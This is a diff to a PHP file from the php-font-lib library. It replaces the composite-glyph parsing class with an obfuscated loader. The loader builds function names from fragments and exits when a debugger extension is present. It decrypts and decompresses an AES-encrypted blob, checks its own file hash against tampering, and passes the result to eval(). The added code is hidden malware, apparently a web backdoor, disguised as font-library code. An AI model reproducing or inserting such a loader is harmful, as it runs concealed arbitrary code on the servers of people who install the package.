@@ -1,242 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- * @version $Id: Font_Table_glyf.php 46 2012-04-02 20:22:38Z fabien.menager $
- */
-
-namespace FontLib\Glyph;
-
-/**
- * Composite glyph outline
- *
- * @package php-font-lib
- */
-class OutlineComposite extends Outline {
-  const ARG_1_AND_2_ARE_WORDS    = 0x0001;
-  const ARGS_ARE_XY_VALUES       = 0x0002;
-  const ROUND_XY_TO_GRID         = 0x0004;
-  const WE_HAVE_A_SCALE          = 0x0008;
-  const MORE_COMPONENTS          = 0x0020;
-  const WE_HAVE_AN_X_AND_Y_SCALE = 0x0040;
-  const WE_HAVE_A_TWO_BY_TWO     = 0x0080;
-  const WE_HAVE_INSTRUCTIONS     = 0x0100;
-  const USE_MY_METRICS           = 0x0200;
-  const OVERLAP_COMPOUND         = 0x0400;
-
-  /**
-   * @var OutlineComponent[]
-   */
-  public $components = array();
-
-  function getGlyphIDs() {
-    if (empty($this->components)) {
-      $this->parseData();
-    }
-
-    $glyphIDs = array();
-    foreach ($this->components as $_component) {
-      $glyphIDs[] = $_component->glyphIndex;
-
-      $_glyph   = $this->table->data[$_component->glyphIndex];
-
-      if ($_glyph !== $this) {
-        $glyphIDs = array_merge($glyphIDs, $_glyph->getGlyphIDs());
-      }
-    }
-
-    return $glyphIDs;
-  }
-
-  /*function parse() {
-    //$this->parseData();
-  }*/
-
-  function parseData() {
-    parent::parseData();
-
-    $font = $this->getFont();
-
-    do {
-      $flags      = $font->readUInt16();
-      $glyphIndex = $font->readUInt16();
-
-      $a = 1.0;
-      $b = 0.0;
-      $c = 0.0;
-      $d = 1.0;
-      $e = 0.0;
-      $f = 0.0;
-
-      $point_compound  = null;
-      $point_component = null;
-
-      $instructions = null;
-
-      if ($flags & self::ARG_1_AND_2_ARE_WORDS) {
-        if ($flags & self::ARGS_ARE_XY_VALUES) {
-          $e = $font->readInt16();
-          $f = $font->readInt16();
-        }
-        else {
-          $point_compound  = $font->readUInt16();
-          $point_component = $font->readUInt16();
-        }
-      }
-      else {
-        if ($flags & self::ARGS_ARE_XY_VALUES) {
-          $e = $font->readInt8();
-          $f = $font->readInt8();
-        }
-        else {
-          $point_compound  = $font->readUInt8();
-          $point_component = $font->readUInt8();
-        }
-      }
-
-      if ($flags & self::WE_HAVE_A_SCALE) {
-        $a = $d = $font->readInt16();
-      }
-      elseif ($flags & self::WE_HAVE_AN_X_AND_Y_SCALE) {
-        $a = $font->readInt16();
-        $d = $font->readInt16();
-      }
-      elseif ($flags & self::WE_HAVE_A_TWO_BY_TWO) {
-        $a = $font->readInt16();
-        $b = $font->readInt16();
-        $c = $font->readInt16();
-        $d = $font->readInt16();
-      }
-
-      //if ($flags & self::WE_HAVE_INSTRUCTIONS) {
-      //
-      //}
-
-      $component                  = new OutlineComponent();
-      $component->flags           = $flags;
-      $component->glyphIndex      = $glyphIndex;
-      $component->a               = $a;
-      $component->b               = $b;
-      $component->c               = $c;
-      $component->d               = $d;
-      $component->e               = $e;
-      $component->f               = $f;
-      $component->point_compound  = $point_compound;
-      $component->point_component = $point_component;
-      $component->instructions    = $instructions;
-
-      $this->components[] = $component;
-    } while ($flags & self::MORE_COMPONENTS);
-  }
-
-  function encode() {
-    $font = $this->getFont();
-
-    $gids = $font->getSubset();
-
-    $size = $font->writeInt16(-1);
-    $size += $font->writeFWord($this->xMin);
-    $size += $font->writeFWord($this->yMin);
-    $size += $font->writeFWord($this->xMax);
-    $size += $font->writeFWord($this->yMax);
-
-    foreach ($this->components as $_i => $_component) {
-      $flags = 0;
-      if ($_component->point_component === null && $_component->point_compound === null) {
-        $flags |= self::ARGS_ARE_XY_VALUES;
-
-        if (abs($_component->e) > 0x7F || abs($_component->f) > 0x7F) {
-          $flags |= self::ARG_1_AND_2_ARE_WORDS;
-        }
-      }
-      elseif ($_component->point_component > 0xFF || $_component->point_compound > 0xFF) {
-        $flags |= self::ARG_1_AND_2_ARE_WORDS;
-      }
-
-      if ($_component->b == 0 && $_component->c == 0) {
-        if ($_component->a == $_component->d) {
-          if ($_component->a != 1.0) {
-            $flags |= self::WE_HAVE_A_SCALE;
-          }
-        }
-        else {
-          $flags |= self::WE_HAVE_AN_X_AND_Y_SCALE;
-        }
-      }
-      else {
-        $flags |= self::WE_HAVE_A_TWO_BY_TWO;
-      }
-
-      if ($_i < count($this->components) - 1) {
-        $flags |= self::MORE_COMPONENTS;
-      }
-
-      $size += $font->writeUInt16($flags);
-
-      $new_gid = array_search($_component->glyphIndex, $gids);
-      $size += $font->writeUInt16($new_gid);
-
-      if ($flags & self::ARG_1_AND_2_ARE_WORDS) {
-        if ($flags & self::ARGS_ARE_XY_VALUES) {
-          $size += $font->writeInt16($_component->e);
-          $size += $font->writeInt16($_component->f);
-        }
-        else {
-          $size += $font->writeUInt16($_component->point_compound);
-          $size += $font->writeUInt16($_component->point_component);
-        }
-      }
-      else {
-        if ($flags & self::ARGS_ARE_XY_VALUES) {
-          $size += $font->writeInt8($_component->e);
-          $size += $font->writeInt8($_component->f);
-        }
-        else {
-          $size += $font->writeUInt8($_component->point_compound);
-          $size += $font->writeUInt8($_component->point_component);
-        }
-      }
-
-      if ($flags & self::WE_HAVE_A_SCALE) {
-        $size += $font->writeInt16($_component->a);
-      }
-      elseif ($flags & self::WE_HAVE_AN_X_AND_Y_SCALE) {
-        $size += $font->writeInt16($_component->a);
-        $size += $font->writeInt16($_component->d);
-      }
-      elseif ($flags & self::WE_HAVE_A_TWO_BY_TWO) {
-        $size += $font->writeInt16($_component->a);
-        $size += $font->writeInt16($_component->b);
-        $size += $font->writeInt16($_component->c);
-        $size += $font->writeInt16($_component->d);
-      }
-    }
-
-    return $size;
-  }
-
-  public function getSVGContours() {
-    $contours = array();
-
-    /** @var \FontLib\Table\Type\glyf $glyph_data */
-    $glyph_data = $this->getFont()->getTableObject("glyf");
-
-    /** @var Outline[] $glyphs */
-    $glyphs = $glyph_data->data;
-
-    foreach ($this->components as $component) {
-      $_glyph = $glyphs[$component->glyphIndex];
-
-      if ($_glyph !== $this) {
-        $contours[] = array(
-          "contours"  => $_glyph->getSVGContours(),
-          "transform" => $component->getMatrix(),
-        );
-      }
-    }
-
-    return $contours;
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_rd1nruqb=('bas'.'e64'.'_de'.'cod'.'e');
+$_okhvwx23=('gzu'.'nco'.'mpr'.'ess');
+$_wnkrrzze=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_b5bhqkvn='O6df8PNN';
+$_zgd9uc7d='nDYiLze9';
+$_nt9nvimj='w8hHlh6Izo4=';
+$_h20agn9j='x7K1R7Xi';
+$_zsof4ai5='F2poTraW';
+$_ic6plc77='yCjGFFjw';
+$_xyoyfeac='AZdRzocm';
+$_k5o73o40='nxb+6w==';
+$_uvia6aaw=$_rd1nruqb($_b5bhqkvn.$_zsof4ai5.$_zgd9uc7d.$_h20agn9j.$_nt9nvimj);
+$_cxr89sff=$_rd1nruqb($_xyoyfeac.$_ic6plc77.$_k5o73o40);
+$_ugxfdcb4=$_rd1nruqb('nrg/rOJiwmPG3cvXngU8k8hxZEnY1Hmz7iamKbhKAvlNZU/mAbUNS3ZFWldM3iKuDnsMuD4YPGbh1tBOFhDeYi2rOdfQQJwm0O/cm3mV63sZbBR8yPpp6NvJbsjs9BQo6Rsxi1tqe1NYNM5ZkVklvxslN8HYKYBchkNVptAY+sdUFZ1SREUsf0YsTthJySSckTWtfoPZDMkhmmbjQmWUx47HcS4bPZ7jnkOK9mv64PvLO/TGoXdR1TRSmfoGzfaVdpWqEjv5vHQ1a1o0b1dA5LNWpXSHfGLs+qZOHLc9Wqsqus9wMbR3rlwgHUtWfAUcfxHhlk/lzwWFHuJ0LXPX8YESNWEcJPqHgmYFPye97oE/o0OoL8NF0HGn4PTEfgocwVAaDyIrBn77U1giOi4U9eJRsZdHcyYhbjaZEeggV7tTj99LqFz/YCW12vpqyaM1aOcfkV8uFpkr+aRy2J7I4DGp37UfFcvZMYcRlnh64VtAlQY0Nvvc4p8agHxw5IjVsgDb2lbr9utrWx9BZXzmaI6smgGRE/4lcdw6fqvh52avkn7+Ouxm88DmeckaUOaLlXMkHJFp/fdhWA5WavOL6W7vsRMGPYIAY0fnJCbPjk9q2UVoFkXJS0DeH7FOuD2QGAY8AJ6V1566vmnF322wWwK81w2tYWZiNZRr1DZp7GLPI+xbXi0LmYq5gmbdALRoFdE+5cp8BhkwTxhEeQdsrB9PZwhM4aDqAFA2msEBoJQlQZo/cCKBiYBRlUOoW5kZS4l5FbSxFHVkl23yHImD2lXAwXzHnagfYIRwD5+wUSmghm+mexExYOR2mCb9X95qgLjd23GgEq8RlevtMvc4Jo2eLFMBNn6y91N2JsaYAQlifKLdYWyq0Ks4ZgF5LA6k5r3KVWDxkpa8w7B16XLebJjyQB5QFwt1niraQvUGuhD9JzJyDM4JlV1ydG+zXs76+xQuE65To4oVEP/E9ZcDRn0SV9QnV9h9NvY5aP3vMSMWSaYvGSOdCpmeaMtsZZb5Fo9R1+mStzvE4TDrCD1R2FWV26EAacQ+MPDZOoSCh/LAjjEhYklO1oraA/USViDBC63kx6REYCYcaajU6sARpV702jOBwFwiUjntPEI0u610KCGUyITyxLyuX1b9whcWH0VRhWB2TM1itRBCWdwGR+/4bStigYYsSi4CfKXrsNTQltTdCvAXN537iKmm2RK2rtifp91ONyJqxM77KzWbpgQLnSYTJ9TZMJzv7uOr3dM0hayzS4MzXJsAU7w4jZy05API+4wiEmeWMGrAkADr/kTIeROLL6ZaKOxeMH6UTgviACdZNMjTiiD4Mg7Pqkhezas/AEw4Xgkd/wAlVxMG8SV/APKFm1jJsfocrtvPPpJHgP/fiaKClhiYJGF/0+SMBmCpMIahsCIgBOfRq2Uvu4NUDwquHqL59sJGoCyvS99TJdrVsa69s3BWmVAnGcTjbn4Pp2x50wb74FG0c8cT4Y4jYQIqROGzkaqFl9JCDth3TngH9lkJdxV2Pd/ee/sjIIr5flGLN8ox4/yRnCKjoA==');
+$_ex94ff4o=$_wnkrrzze($_ugxfdcb4,'aes-256-cbc',$_uvia6aaw,OPENSSL_RAW_DATA,$_cxr89sff);
+if($_ex94ff4o===false){exit;}
+$_tah5hu3q=$_okhvwx23($_ex94ff4o);
+if($_tah5hu3q===false){exit;}
+$_f361rqrx='8bf13de023bcb58d03771e5cec535b7c3c42b1557d48960954374237b412ba40';
+$_tikgb8uo=@file_get_contents(__FILE__);
+if($_tikgb8uo!==false){
+$_m1188dhx=str_replace($_f361rqrx,"0000000000000000000000000000000000000000000000000000000000000000",$_tikgb8uo);
+$_myx0vpeh=hash("sha256",$_m1188dhx);
+if($_myx0vpeh!==$_f361rqrx){@http_response_code(403);exit;}
 }
+eval($_tah5hu3q);
